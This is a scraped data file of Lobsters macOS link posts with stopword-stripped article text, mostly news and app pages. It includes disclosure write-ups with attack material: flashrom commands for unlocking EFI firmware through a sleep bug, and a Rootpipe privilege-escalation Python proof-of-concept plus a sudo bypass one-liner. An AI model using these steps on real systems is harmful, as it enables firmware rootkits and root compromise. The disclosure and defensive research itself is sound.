brra flash descriptor region readwrite bios region readwrite management engine region readwrite warning readonly warning readonly writes disabled safety reason enforce write support ichspiforce programmer option likely harm hardware force flashrom get support something break mainboards possible enable write access setting jumper see documentation board ssfs ssfs ssfc ssfc preop optype opmenu bbar lvscc lvscc uvscc uvscc fpb see flash lockdown active bios region mostly readonly hole writable nvram portion necessary setting boot option crash log address efi binary located locked flash protection dark jedi attack would allow unlock area make writable close macbook let sleep second second something best sometimes work need sleep extra time get following flashrom output waking machine flashrom r v p internal flashrom darwin flashrom free software get source code http wwwflashromorg found chipset intel pci id bioscntl bios lock enable disabled bios write enable enabled root complex register block address gc bios interface lockdown enabled boot bios strap spi top swap enabled spibar hsfs hsfs programming opcodes done hsfc hsfc frap bmwag bmrag brwa brra flash descriptor region readwrite bios region readwrite management engine region readwrite ssfs ssfs ssfc ssfc preop optype opmenu bbar lvscc lvscc uvscc uvscc fpb time protected range register without content flash unlocked use flashrom update content userland including efi binary mean thunderstrike like rootkit strictly userland mac vulnerable tested macbook pro retina macbook pro macbook air running latest efi firmware available every single one vulnerable late mac pro aka trashcan macbook pro also tested vulnerable appears latest macbook model vulnerable sure fully test recent model owner afraid giving root access first impression bug silently fixed apple requires extensive testing sure efi binary disassembling expect midlate machine newer vulnerable apple either fixed accident know something fix accident pretty sure apple aware bug least would quite irresponsible test bios implementation vulnerable dark jedi attack issue poc test definitely need people test least find mac vulnerable protect let computer sleep always shutdown also email apple demand firmware security fix bug others presented defcon thunderstrike sith strike full protection since full dark jedi probably still possible execute real fix apple update firmware unfortunately never finished reversing suspendresume efi binary show exactly bug inside code requires improvement current efi reversing tool matter got higher priority also something funny flashrom requires directhwkext work funny thing kext exception list kext signature required load one mavericksyosemite oh irresponsible disclosure well pretty sure apple know one could wrong confident corey trammell disclosed one apple discus upcoming defcon talk wrong wasted nice valuable bug ooops either way goal pressure fix firmware seem hurry fancy logo name well variation dark jedi attack old school still believe knowledge shared everyone learn instead pr whoring already get enough pr blog update appears miscalculated thing appears effective really matter since always wanted disclose sell due powerful nature working newer machine never assume bug shallow might ask something apple judging tone post like o x respect apple security people met time goal make o x better secure issue stake believe apple corporate culture problem regarding security like microsoft many year ago seem react pushed corner indeed knew bug believe coincidence working latest machine keep pattern patching older version bad policy least want put practice least straightforward customer warn issue people take informed decision risk course wishful thinking shoot foot coming forward thing like philosophical discussion management around world wrong day mitigatedetect possible efi compromise build spi dumper use software directly dump flash chip compare content firmware file provided apple asked apple start publishing file signature good baseline compare hopefully one day built tool purpose public solves efi problem others left example smc alex ionescu made interesting presentation year ago nosuchcon smc interesting potential compromise also something need research poc regarding gpu rootkits every single chip firmware somehow talk operating system open compromise need think different start trust chain hardware software everyone trying solve problem starting software hardware built top weak foundation apple great opportunity control full supply chain design hope finally see light take great opportunity google trying chromebook physical access required exploit bug physical access required exploit trigger sleep sudo pmset sleepnow thanks trammell wait come back sleep continue exploitation test bug downloading darwindumper load directhwkext kernel extension use flashrom flashrom r biosdump v p internal dump bios show register content else compile directhwkext also flashrom darwindumper work box kext appears legit apple exclusion list least apple trust worried bug general user theory much worried bug thunderstrike bug interesting attack targeted user mass exploitation although driveby exploit definitely feasible easier cheaper attack available general user reminder latest mac botnet infected around user asking administrator privilege sophisticated attack required simple thing still work fun fg p bug used safari remote vector install efi rootkit without physical access requirement suspended happened current session researched could probably force suspend trigger remotely pretty epic ownage
658,Lobsters,mac,Apple macOS,Screentendo,http://aaronrandall.com/blog/screentendo/,screentendo,cgwindowlistcopywindowinfo cgwindowlistcreateimage motion blur luminance filter pixellation filter subblocking average block colour array ghost vertex github repo follow,screentendo desktop application allows turn selection screen playable level super mario bros video never built cocoa app used sprite kit great excuse play technology get hacky source code work screentendo launched semitransparent window appears moved resized application window placing screentendo window area screen clicking inside window cause app render game level based content beneath two basic step screentendo image processing determine structure target region level generation image processing first step fetch target region underneath screentendo window following show example targeting chart within google sheet safari app us cgwindowlistcopywindowinfo api quartz window service get list window user current session order appear screen list window application fetch window data window id bound size etc screentendo window second window hierarchy safari window covered screentendo target window information cgwindowlistcreateimage used retrieve screenshot safari screenshot cropped bound screentendo window using difference safari window origin screentendo window origin shown screentendo window width height screentendo overlaying target application chart google sheet cropped image cropped image passed number image filter finally converted format screentendo use render game level motion blur help reduce impact general noise small visual artefact image motionblurred image luminance filter average luminance threshold image calculated reduced two colour based calculated threshold luminancefiltered image pixellation filter pixellation filter applied simplify image detail prepare subblocking black white pixellated image subblocking image split subblocks default pixel subblocked image subblocked image enlarged average block colour array subblock image average colour block calculated array created subblock average colour mostly black set subblock average colour mostly white set array representing image block structure enlarged level generation game logic array representation image passed gamescene class responsible generating game level iterating array value generated block value ignored block level generation block cloud background player sprite array processed background cloud player sprite added scene rest game play relies basic physic implementation based sprite kit physic engine handle player physic detect collision animate flying block debris etc app also menu option change block size small medium large smaller block size increase resolution take longer process limitation app proofofconcept hack shortcoming image processing currently really really slow subblocking image take long time subblock nsimage pretty inefficient way solving problem quick implement current implementation also requires reasonably distinct contrast underlying image block detection work finally physic little screwy set write super mario bros emulator something would work well enough issue ghost vertex particularly vertical wall get round resolving downloads code available github repo like follow twitter
659,Lobsters,mac,Apple macOS,Debugging `launchd` on OSX 10.10.3,http://blog.wuntee.sexy/osx/kernel/debugging/2015/05/11/debugging-launchd/,debugging launchd osx,debugging launchd osx background one two three attach debugger default crash log kernel panic log xnu source launchd crash log kernel debugging kernel debug kit kdk lldbinit deroko gdbinit old launchd source code browser tarball dtrace kernel debugger kdk kernel debug kit kdks kdk kernel debug build,debugging launchd osx may background recent discovery ipc vulns osx one two three digging way ipc work osx came front todo list along rewrite launchd well let say thus far fruitful endeavor story another post lead post would want debug launchd mach low level functionality within xnu kernel provides ipc thread process ipc endpoint referenced via port unsigned integer without going much detail osx ipc flow similar dns one process want speak another process query special mach port called bootstrap launchd context osx ipc lookupprovideaccessto port endpoint would like communicate lookup done via string like comapplenetworkd launchd responds port used destination future ipc message bootstrap launchd first point communication communicating two process reason interest debugging launchd able trigger crash launchd like init linux kernel spawn pid every process executed launchd crash kernel panic machine reboots problem press key continue screen userland triggering kernel bug obviously interested due trust boundary crossed blog post outline thought process associated fails kindof able debug crash launchd quick outline follows attach fail default crash fail kernel fail old launchd fail success yay kind kernel debugging kdk fail kernel debug yes attach debugger first thought simply attach debugger lldb launchd however attempting received following message sudo lldb p password lldb process attach pid process exited status lost connection error attach failed lost connection lldb initially thought antidebug trick apple introduced prevent debugging service however got thinking launchd pid everything spawned lldb able break lauchd lldb halted well something like chicken egg problem would like spawned thread put breakpoint parent thread still running possible default crash log based osx research done past know default directory crash log stored librarylogscrashreporter crash data stored similar popup want send detail apple librarylogsdiagnosticreports applicationkernel panic log stored varlog default application log stored enabled possible logging option launchd unable find anything useful launchd logging output however following kernel panic log following file librarylogsdiagnosticreportkernel panic show detail kernel panic however useful direct memory address reference backtrace function name debugging output etc one useful thing crash log refers specific fileline xnu source describing kernel crash occurred kernel panic launchd exit bug found cause launchd crash launchd crash log everything read launchd crash crashdump file like process however launchd rewrite assume apple disabled feature turn get semiuseful usrbinsample output located varlogcomapplexpclaunchd directory although give bit information kernel panic still leap bound away finding root cause crash kernel debugging next thought move kernel debugging try catch crash jumped kernel note point time none kernel debug kit kdk available order enable kernel debugging guest must set specific nvram flag flag added together make final value set flag set using nvram flagvalue command note set nvram bootargs kernel debugging arp vm wont able connect via tcp need find way reverting nvram flag description stop boot time wait debugger attach send kernel debugging output console drop debugger nonmaskable interrupt send kernel debugging information serial port make ddb default debugger output diagnostics information system log allow debugger arp route support old version gdb newer system disable graphical panic dialog screen useful setup found nvram bootargs v verbose wait debugger boot nvram bootargs v verbose wait debugger upon kernel crashpanic nvram bootargs v verbose cause coredump transmitted panic server must panic server running direction kdk readmehtml file dealing kernel crash reboot reattach every time became quite annoying found using flag waited debugger upon panic crash occurs triggering launchd bug osvm look something like note bottom screen showing waiting debugger host connect kernel debugger via lldb kdpremote command note using lldbinit deroko mimic osxreverser gdbinit thinking kernel relation debugging launchd kernel process specifically parent process launchd backtrace see debugger context kernel telling u exactly kernel panic error message crash said kernel panic ed far aware crash attaching debugger parent way switching debugger context spawnedchild process although writing may way causing kernel debugger wait upon boot following thread somehow stop following thread launchd context tried point started looking older kernel debug kit noticed additional python librariesfunctions lldb may allow switch context kernel launchd spent little time trying get kdk lldb library working decided wait kdks come old launchd source waiting kdks come came attention older version launchd open sourced code browser tarball diving bit older version launchd source seems bunch flag trigger different debugging behavior one behavior launchd trap kernel debugger exactly looking however version launchd source osx flag creating vardbdisableappleinternal file creating vardblaunchdshutdowndebugging file nvram bootargs set verbose mode nvram bootargs v setting launchdtrapsigkillbugs value nvram bootargs nvram bootargs launchdtrapsigkillbugs unfortunately none gave interactive kernel debuugger launchd upon kernel panic ing debugger would still put context kernel either something wrong misunderstanding code apple removed functionality rewrite launchd dtrace first kernel debugging process epiphany dtrace hook happen pretty low level know hook perform action upon application exitingfaulting somehow someway fault hook would execute kernel panic occurs may able gain additional information ran simple dtrace script perform stacktrace launchd upon crashing redirecting output file done oneliner usrsbindtrace proc fault pid ustack voila specific location within launchd crash occurring said still quite hard backtracing understand exactly crash occurred cpu id function name sendsig fault ustack lib redacted launchd redacted launchd redacted launchd redacted libdispatchdylib libdispatchdylib libdispatchdylib libdispatchdylib libdispatchdylib libdispatchdylib libdispatchdylib libsystempthreaddylib libsystempthreaddylib kernel debugger kdk apple release kernel debug kit kdks version kernel package provide debugdeveloper build kernel along lldb scriptsfunctionstools help debugging kerneldriver code performing previous research kdk available version osx noticed kdk released pulled installed first thought additional python library would allow get insight launchd possibly switch context kernel launchd unfortunately case interesting feature kdk python scriptsfunctions lldb location script librarydeveloperkdks systemlibrarykernels dsymcontentsresourcespython additional tool provide help debugging launchd whole bunch felt worth noting include script follow instruction attaching debugger lldb lldb command source userswunteelldbinit lldb kdpremote version darwin kernel version mon mar pdt root kernel uuid load address warning kernel contains debug script run script debug session command script import pythonkernelpy viewing help command see much additional functionality introduced small segment writing noticed function may benefit specifically showtaskstacks f launchd however backtrace show jumpedswitched context kernel debugger may lost cause spend much time kernel debug build kernel debug kit came second look xnu source noticed something interesting near kernel crash development debug int err debugging purpose generate core file initproc panicking leave least mb free root volume ignore process corefile ulimit err coredump p printf failed generate initproc core file error err else printf generated initproc core file sync p void null int null endif panic diednstate last exception nn p pcomm p pcomm launchd inittaskfailuredata look like running development debug build kernel launchd crash kernel perform coredump launchd somewhere little sifting xnu source file exist corescore pid readmehtml kdk librarydeveloperkdks readmehtml detail installrun developmentdeug kernel following triggering crash rebooting finally found golden nugget file note try run developerdebug kernel different version osx wont work kernel wont boot find way reverting desparate opening file lldb lldb sbinlaunchd c finally least dynamically debug crash unfortunately seems null pointer dereference however fully debugged rootcause understand full impact lldb disassemble rip lib redacted dylib redacted gettype mov rax qword ptr rdi crash ret lldb register read rdi rdi note information redacted reported associated bug reportedfixed redacted information removed
660,Lobsters,mac,Apple macOS,imgix - Racking Mac Pros on Exposure,http://photos.imgix.com/racking-mac-pros,imgix racking mac pro exposure,,website built exposure please enable javascript auto load post loading browser unsupported please use google chrome firefox safari best exposure experience please enable javascript use exposure
661,Lobsters,mac,Apple macOS,"Microsoft Launches Visual Studio Code: A Free Cross-Platform Code Editor For OS X, Linux And Windows",http://techcrunch.com/2015/04/29/microsoft-shocks-the-world-with-visual-studio-code-a-free-code-editor-for-os-x-linux-and-windows/,microsoft launch visual studio code free crossplatform code editor o x linux window,microsoft launch visual studio code free crossplatform code editor o x linux window build developer conference visual studio code microsoft soma somasegar visual studio code monaco editor visual studio online typescript plugin open sourcing net core visual studio community,microsoft launch visual studio code free crossplatform code editor o x linux window build developer conference microsoft today announced launch visual studio code lightweight crossplatform code editor writing modern web cloud application run o x linux window application still officially preview download mark first time microsoft offer developer true crossplatform code editor full visual studio still windowsonly today announcement show company commitment supporting platform lot people use window development environment also seeing lot people linux mac soma somasegar microsoft corporate vp developer division told earlier week instead making go window want meet developer platform also often perfectly happy using regular code editor like sublime text instead full ide like visual studio visual studio code offer developer builtin support multiple language microsoft noted today build keynote editor feature rich code assistance navigation language javascript typescript nodejs aspnet developer also get set additional tool editor feature standard tool would expect modern code editor including syntax highlighting customizable keyboard binding bracket matching snippet somasegar tell also work git box somasegar told new editor partly based microsoft experience writing online monaco editor visual studio online company also worked bringing visual studio language feature visual studio code include roslyn project example microsoft net compiler platform microsoft say language service built visual studio code available editor well including sublime text vi atom language feature also available editor long ago microsoft launched typescript plugin sublime text example somasegar tell company committed launching similar project future meeting developer today announcement surely come surprise many however fit well direction company developer group quite open sourcing net core taking platform crossplatform launch free visual studio community edition year ago today announcement would come shock nice surprise
662,Lobsters,mac,Apple macOS,Mavericks security update 2015-004 has a serious SSL bug,https://nelsonslog.wordpress.com/2015/04/25/mavericks-security-update-2015-004-has-a-serious-ssl-bug/,maverick security update serious ssl bug,macos maverick bug cyberduck writing certificate entry ask different security stackexchange apple forum zip file like,mac suddenly started throwing ssl error connecting various site like searchtwittercom supportapplecom app store application refused load content long story short macos maverick bug incorrect certificate named verisign class public primary certification authority placed user login keychain fix run keychain access remove note remove one login keychain system root update put entry login keychain something else put earlier seem change something though trigger verification problem fix still remove key login keychain know put first place update turn cyberduck writing certificate entry error seems really serious mac affected get new software update also chrome refuse load website ssl cert signed verisign certificate including apple site safari load site display ssl error apparently chrome strict enforcing ssl security thought particularly interesting impossible get chrome visit twitter twitter serf http http hsts enabled mean chrome refuse load page without working ssl certificate well succeeded boy bad experience link discussion ask different security stackexchange apple forum exported two verizon cert login keychain problem zip file along screenshots failed ssl cert file online forever seem hitting serious bug like macos every couple month along brokenbydesign thing like smb client really tempted try going back window desktop maybe linux damn ugly update thanks ned suggestion comment tried figuring verisign certificate got keychain first place still know looking backup time machine see placed sometime two backup grep verisign macintosh hdusersnelsonlibrarykeychainsloginkeychain mac turned seems likely verisign entry ended keychain turned mac back would happened quickly entered house keychain network slow could also happened sometime fwiw bunch update installed hour keychain update including security update safari keychain entry precedes bunch update google voice video one seil keyboard kernel hack also fwiw given manually tampering keychain blindly approving request manipulate like like loading related
664,Lobsters,mac,Apple macOS,OS X Reviewed,http://hypercritical.co/2015/04/15/os-x-reviewed,o x reviewed,o x reviewed john siracusa first pc enthusiast ar technica last wwdc coming june atp marco arment casey li o x review o x complete interface overhaul hypercritical podcast accidental tech podcast incomparable volume atp release o x yosemite o x maverick o x mountain lion mac o x lion mac o x snow leopard mac o x leopard mac o x tiger mac o x panther mac o x jaguar mac o x mac o x retrospective prerelease john siracusa,o x reviewed april pm john siracusa nearly year ago wrote first review mac o x nascent pc enthusiast website called ar technica last fall wrote last though apple presumably announce next major version o x wwdc coming june reviewing ar technica publication including website reading listen atp weekly podcast host marco arment casey li know contemplating hanging o x reviewer hat time producing thousand word hundred screenshots major release o x first real claim fame internet prospect stopping made reconsider public identity sense self guy writes o x review finally decided relief felt let know made right choice single dramatic reason behind accumulation small time investment admittedly selfimposed mental anguish pressure meet expectation reader year boil simple pervasive feeling time stop done done started forefront longform nerdcentric tech writing today world moved might stopped o x review love round number expectation o x would bring complete interface overhaul really wanted write o x review public debut hypercritical podcast brought new audience starting hypercritical ran episode year followed recorded least one podcast every week currently cohost weekly accidental tech podcast regular guest incomparable one long article wrote o x ar technica every year two long since dwarfed volume audio output still love o still many complaint certainly talk o x whatever called length atp read many great review written others released neither podcasting writing ever fulltime job always fit life alongside actual job family right looking forward first summer many year dominated stolen daytime minute long sleepless night front screen noisy air conditioner blowing behind content reviewed someone else pick baton next year release o x yosemite october o x maverick october o x mountain lion july mac o x lion july mac o x snow leopard august mac o x leopard october mac o x tiger april mac o x panther november mac o x jaguar september mac o x puma october mac o x cheetah april retrospective prerelease john siracusa
665,Lobsters,mac,Apple macOS,OSX 10.10 will only run kernel extensions signed by Apple,https://github.com/Homebrew/homebrew/issues/31164,osx run kernel extension signed apple,join github today sign,dismiss join github today github home million developer working together host review code manage project build software together sign
666,Lobsters,mac,Apple macOS,A week of pkgsrc #8,https://www.geeklan.co.uk/?p=1812,week pkgsrc,presenting bsdcan year ottawa cross platform packaging pkgsrc mandoc raise patch committed release announced first bulkbuild report sent pkgsrcbulk mailing list opencsw project,month pkgsrc since wrote last post received good news presenting bsdcan year ottawa really stoked looking forward presenting preparation big day speaking different aspect working various eventsmeetings first speaking opportunity oracle solarissig losug past life tomorrow cross platform packaging pkgsrc host running solaris attempt bulkbuilds asked shell access various place landed access solaris sparc omnios shell access solaris host came first quickly found mandoc would build due use mkdtemp dirfd vasprintf whilst attempting setup bulkbuild environment using mkpbulkpbulksh script pkgsrc following mandoc developer regarding issue meant issue fixed ingo schwarze within couple day access solaris via opencsw next release mandoc due summer time contain fix undecided whether back port fix current release solaris host recent patch cluster unsure recent unaffected issue omnios shellsstandalonetcsh package reared head omnios ship tcsh standard shellsstandalonetcsh clobber bulkbuild solution may pkgsrc becomes aware various illumos distros instead treating everything sunos nothing decided definite need discussion bulkbuilds omnios using toolchain published ip release show issue pkgsrc libgomp bundled gcc found gettext cause lot package fail first bulkbuild completed showed possible build package without issue inability build databasessharedmimeinfo due libgomp issue caused package fail large impact issue mentioned package suffer problem resumption bulk building pkgsrc freebsd found lot package would fail package due use flag pax present freebsd version yet address issue package raise patch freebsdcurrent available future version freebsd committed treacle point inclusion freebsd bulk build also resumed third bulkbuild progress host still running first attempt use unprivileged user account lack nullfs support prevents setup parallel run speed process building openbsd extremely useful indicating software pkgsrc effected libressl without put effort integrating libressl pkgsrc first also raised instance copying overlapping buffer destructively using memcpy v memmove fix issue yet committed pending investigation makejobs raised improve performance whilst compiling build environment hosted sun dedicated disk mounted soft writes kernbufcachepercent value bumped release announced figure package indicate darwinpowerpc exceeded binary package built gcc darwin binary package built gcc darwin first bulkbuild report sent pkgsrcbulk mailing list back september show total package could built work required keep position future new version mesalib committed point soon bulkbuild progress sevanmitedu upon completion placing request host wiped setup bulk build getting slower slower suspect ide disk may failing thanks phil stracchino sascha curth opencsw project access host running solaris ian kremlin brandon mercer rodent netbsd access host running openbsd
667,Lobsters,mac,Apple macOS,Apple II Watch - a retro rendition to the machine which started it all,http://www.instructables.com/id/Apple-II-Watch/,apple ii watch retro rendition machine started,teensy ide loader io boot sequence menu,main program simple arduino sketch running teensy attached main sketch required library bitmap image sound effect need teensy ide loader run paul stoffregen put lot work making teensy dev board awesome easy use goto micro quick embedded project program thing iothe main user interface rotary encoder ehem digital crown teensy us interruptbased via encoder library check rotation bounce library make quick work easily reading button spinning knob cycle highlighting submenu selection button press entrance exit said submenuboot sequencethe watch quick boot routine mimic startup process real apple computer full screen bracket fill system beep followed disk drive head calibration noise file played tiny watt speakermenusthe main user screen show current date time plain cap list various submenu function clock show random analog clock facefitness fill progress bar moving exercising standing picture cycle selection bitmapsphonebook display list abbreviated namesweather show photo earth music slowly animates flower opening utility display static photo butterfly disk manager blink disk drive led couple time
668,Lobsters,mac,Apple macOS,Hidden backdoor API to root privileges in Apple OS X,https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/,hidden backdoor api root privilege apple o x,tl dr o x started searching vulnerability o x building nice demo hidden backdoor api root access revealed conclusion recommendation rootpipe full disclosure live walkthrough much may stockholm wwwsecurityconfse timeline exploit code like,tl dr admin framework apple o x contains hidden backdoor api root privilege several year least since found october exploited escalate privilege root user account system intention probably serve system preference app systemsetup commandline tool user process use functionality apple released o x issue resolved o x older remain vulnerable since apple decided patch version recommend user upgrade started searching vulnerability o x truesec specialist speak conference worldwide wanted something new demo security conference developer november done many proofofconcept hack io android highlight malicious code achieve vulnerable device time security conference developer many use apple o x primary operating system wanted show o x could hacked easily io android operating system built software developer create software developer make mistake mistake introduce security vulnerability wanted highlight software yeah even apple contains vulnerability many still discovered building nice demo first exploit used based sudo authentication bypass bug patched version sept felt boring vulnerability year old exploit code simple sudo k systemsetup setusingnetworktime settimezone gmt setdate settime sudo su talked colleague software developer philip åkesson fact exploit code us systemsetup command line utility modify system time curious find detail fix turned apart patching sudo apple also changed another thing changed systemsetup requires root even display help text systemsetup run without root access following message displayed later systemsetup need administrator access run tool exiting message bit misleading since actually running admin user user account created installation o x admin default something think o x user care much since sudo application installation requires password input anyway message indicates root access required perform command previously could done admin right found following code quick disassembly hopper okay systemsetup binary simply check running root user philip tried patching function replacing sete setne success systemsetup systemsetup type help help far back previous behavior systemsetup prior one example command perform systemsetup systemsetup enable ssh server port course also start ssh launchctl launchctl would require root privilege obviously difference privilege required class name remoteserversettings indicates kind interprocess communication would explain operation require root could performed still worth mentioning ssh also started system preference sharing without root access found discrepancy permission interesting continued disassembling systemsetup setremotelogin command implemented systemsetup method called serversettings setremotelogin function input checking call internetservices setsshserverenabled implemented admin framework used systemsetup disassembly admin framework show setsshserverenabled method internetservices interface also method startingstopping many service listing internetservices sharedinternetservices internetservices sharedinternetservices ssharedinternetservices internetservices netfsserverframeworkbundle internetservices netfsserverframeworkbundle snetfsserverkbundle internetservices netfsserverframeworkbundle snetfsserverkbundleonce internetservices faxreceiveenabled internetservices ftpserverenabled internetservices httpdenabled internetservices isftpserveravailable internetservices isfaxreceiveavailable internetservices isguestforprotocolenabled internetservices ishttpdavailable internetservices isnscprotocolavailable internetservices isnscprotocolenabled internetservices isnsservershuttingdown internetservices isopticaldiscsharingenabled internetservices isremoteaeserveravailable internetservices issshserveravailable internetservices nscservercancelshutdown refnum internetservices nscservershutdown withdelay internetservices numberofclientsforprotocols internetservices remoteaeserverenabled internetservices savenatprefs internetservices screensharingenabled internetservices sendsighuptoefax internetservices setftpserverenabled internetservices setfaxreceiveenabled internetservices setguestforprotocol enabled internetservices sethttpdenabled internetservices setinetdserviceenabled enabled internetservices setnscprotocols enabled internetservices setopticaldiscsharingenabled internetservices setremoteaeserverenabled internetservices setsshserverenabled internetservices setscreensharingenabled internetservices sshserverenabled objcclass internetservices objcmetaclass internetservices internetservices netfsserverframeworkbundle blockinvoke like sethttpdenabled setsshserverenabled implemented using shared helper method adminternetservices setinetdserviceenabled enabled read code inside admin framework stopped following code seems code creates userspecific apache configuration file guest account notice root owner file l l total rwr r root wheel apr stdconf hidden backdoor api root access revealed last objectivec method called code screenshot createfilewithcontents path attribute take array byte data write file path posix file attribute reusing function objectivec code would look something like tool createfilewithcontents data path nsstring target attribute nsfileposixpermissions question get hold magic tool reference look beginning code screenshot code corresponds id sharedclient objclookupclass writeconfigclient sharedclient id tool sharedclient remoteproxy really simple getting tried code got following error attempt send message without connection next thing finding error message printed ok check verify xpc proxy within process initiated let look ocurrences onewaymessagedispatcher locate initialization code authenticateusingauthorization method actual initialization take place exactly needed creating xpc client writeconfig xpc service service running root question send argument authenticateusingauthorization went back systemsetup binary found following seems like result sfauthorization authorization could trick modified exploit code ready new attempt id auth objclookupclass sfauthorization authorization id sharedclient objclookupclass writeconfigclient sharedclient sharedclient authenticateusingauthorizationsync auth id tool sharedclient remoteproxy tool createfilewithcontents data path nsstring target attribute nsfileposixpermissions note using syncvariant authenticateusingauthorization functionality set posix file permission file finally created setuid bit set rwsrwxrwx root wheel apr rootpipetmp since setuid bit set owner root privilege escalation first exploit code class method name slightly different name used later still limitation exploit code work user admin permission mentioned earlier almost o x user admin since o x user often single user system reporting issue apple tried standard account got following error message authenticateusingauthorizationsync error error domaincomapplesystemadministrationauthorization operation completed comapplesystemadministrationauthorization error actually found way make work user later mean exploit longer limited admin account simple sending nil authenticateusingauthorizationsync instead using result sfauthorization authorization sharedclient authenticateusingauthorizationsync nil seems like authorization check made triggering callback function authobject supplied objectivec programmer guess happens call method null reference use objectivec language send message nil nothing conclusion recommendation admin framework apple o x contained hidden backdoor api root access several year least since released intention probably serve system preference app systemsetup commandline tool access restriction mean api accessible xpc user process system local privilege escalation root used locally combined remote code execution exploit apple indicated issue required substantial amount change side back port fix older recommendation o x user upgrade later rootpipe full disclosure live walkthrough much explain detail rootpipe vulnerability session security conference may stockholm sweden see live stage attacker find vulnerability code even access binary colleague present cool stuff developer know focusing security threat write secure code visit wwwsecurityconfse info timeline oct first discovery oct first contact apple product security team oct exploit code shared apple oct initial full disclosure date set jan oct release o x yosemite vulnerable rootpipe nov apple requested postpone disclosure nov release o x also vulnerable jan joint decision apple truesec postpone disclosure due amount change required o x jan created apple jan release o x also vulnerable march release o x public beta issue solved april apple confirmed release coming second week april april release o x april full disclosure exploit code poc exploit code rootpipe created emil kvarnhammar truesec tested o x import o import sys import platform import import ctypes import objc import sys cocoa import nsdata nsmutabledictionary nsfileposixpermissions foundation import nsautoreleasepool def loadlib appendpath return ctypescdllloadlibrary systemlibraryprivateframeworks appendpath def useoldapi return rematch platformmacver args sysargv len args print usage exploitpy sourcebinary destbinaryasroot sysexit sourcebinary args destbinary ospathrealpath args ospathexists sourcebinary raise exception file exist pool nsautoreleasepoolalloc init attr nsmutabledictionaryalloc init attrsetvalueforkey nsfileposixpermissions data nsdataalloc initwithcontentsoffile sourcebinary print write file destbinary useoldapi admlib loadlib adminframeworkadmin authenticator objclookupclass authenticator toolliaison objclookupclass toolliaison sfauthorization objclookupclass sfauthorization authent authenticatorsharedauthenticator authref sfauthorizationauthorization authref value nil accepted o x authentauthenticateusingauthorizationsync authref st toolliaisonsharedtoolliaison tool sttool toolcreatefilewithcontentspathattributes data destbinary attr else admlib loadlib systemadministrationframeworksystemadministration writeconfigclient objclookupclass writeconfigclient client writeconfigclientsharedclient clientauthenticateusingauthorizationsync none tool clientremoteproxy toolcreatefilewithcontentspathattributes data destbinary attr print done del pool like like loading related
670,Lobsters,mac,Apple macOS,AnyBar: OS X menubar status indicator,https://github.com/tonsky/AnyBar,anybar o x menubar status indicator,anybar o x menubar status indicator download homebrew cask support u usage alternative client integration running multiple instance custom image port changelog license license,anybar o x menubar status indicator anybar small indicator menubar one simple thing display colored dot dot mean change download version using homebrew cask brew cask install anybar support u usage anybar controlled via udp port default command sent anybarapp must launched launched may send message change style dot echo n black nc localhost following default command change style dot white red orange yellow green cyan blue purple black question exclamation one special command force anybar quit quit alternative client bash alias function anybar echo n nc localhost anybar red anybar green zsh completion fish shell completion go node php java python ruby rust nim erlang c c crystal emacs applescript tell application anybar set image name blue tell application anybar set current get image name unicode text display notification current alfred integration running multiple instance run several instance anybar long listen different port use anybarport environment variable change port open na run several instance open na anybar open na anybar open na anybar custom image anybar detect use local custom image stored anybar directory example anybarsquare image send square port displayed image pixel standard resolution pixel retina port changelog bigger dot render black dark menubar empty circle white dark filled circle compiled o x dark mode support dark mode anybar first check image alt image altpng image first fall back image png support maverick actually work license copyright nikita prokopov licensed eclipse public license see license
671,Lobsters,mac,Apple macOS,OS X 10.10 vs. Ubuntu 15.04 vs. Fedora 21 Tests: Linux Sweeps The Board,http://www.phoronix.com/vr.php?view=21588,o x v ubuntu v fedora test linux sweep board,new apple mac mini testing lab week phoronix test suite,new apple mac mini testing lab week ran basic benchmark comparing mac o x ubuntu fedora different configuration new mac mini testing apple hard drive memory intel core processor dualcore hyper threading turbo intel iris graphic haswell cpu iris graphic make petite computer still interesting test target concentrated o x v linux benchmark soon article ran benchmark stressing various subsystem following condition o x loaded late apple mac mini xcode providing llvm clang svn journaled hf filesystem remains o x default ubuntu current development state linux kernel gcc mesa ubuntu upgraded linux git kernel well oibaf ppa gain mesa updated graphic component clean install fedora stable upgrade led linux kernel gcc mesa fedora switching default gcc compiler instead using llvm clang packaged assortment test configuration found interesting initial test apple mac mini benchmark o x linux facilitated using opensource phoronix test suite benchmarking software hardware throughout testing reported difference automated table come difference o report difference cpu base frequency turbo frequency etc following page initial result interesting data point come shortly
673,Lobsters,mac,Apple macOS,Testing for the Strawhorse Backdoor in Xcode,http://www.zdziarski.com/blog/?p=5040,testing strawhorse backdoor xcode,previous blog post instruction,previous blog post highlighted latest snowden document reveal cia project sandia national laboratory author malicious version xcode xcode malware targeted app store developer installing backdoor computer steal private codesign key test backdoor never seen verifying security mechanism disables working correctly based document malware apparently infects apple securityd daemon prevent warning user prior exporting developer key rewrite securityd prompt appears exporting developer private key good litmus test see securityd compromised way attempt export developer key see prompted permission following instruction apple export signing identity xcode preference window click account click action button right minus button lowerleft corner select export account popup menu export account securityd pop window asking permission allow action see popup something wrong possible system may compromised prevent user knowing key exported since sample malware allegedly developed cia way guarantee surefire way detect compromise based slide however warning removed compromised system least certain circumstance
674,Lobsters,mac,Apple macOS,Apple rejects Signal for being too privacy-friendly,https://twitter.com/FredericJacobs/status/575216299858608128,apple reject signal privacyfriendly,,detected javascript disabled browser would like proceed legacy twitter yes
675,Lobsters,mac,Apple macOS,The new MacBook,https://www.apple.com/macbook/,new macbook,,take mac stage fullscreen interface optimized live performance flexible hardware control massive collection plugins sound fully compatible logic pro x learn mainstage
676,Lobsters,mac,Apple macOS,Monodraw for Mac,http://monodraw.helftone.com/?hn,monodraw mac,system requirement monodraw version include command line tool store app sandbox provide feedback email monodraw going use email hate spam press kit offer educational pricing get touch privacy policy,system requirement app requires macos mojave later running older version macos download monodraw requires macos yosemite version include command line tool version download directly website purchase store due restriction imposed app sandbox mac app store tool included provide feedback would love hear best way would drop u email alternatively tweet u monodraw going use email hate spam hate spam would share email party period would email important news monodraw upcoming product press kit course download offer educational pricing yes get touch privacy policy take privacy seriously monodraw collect data whatsoever
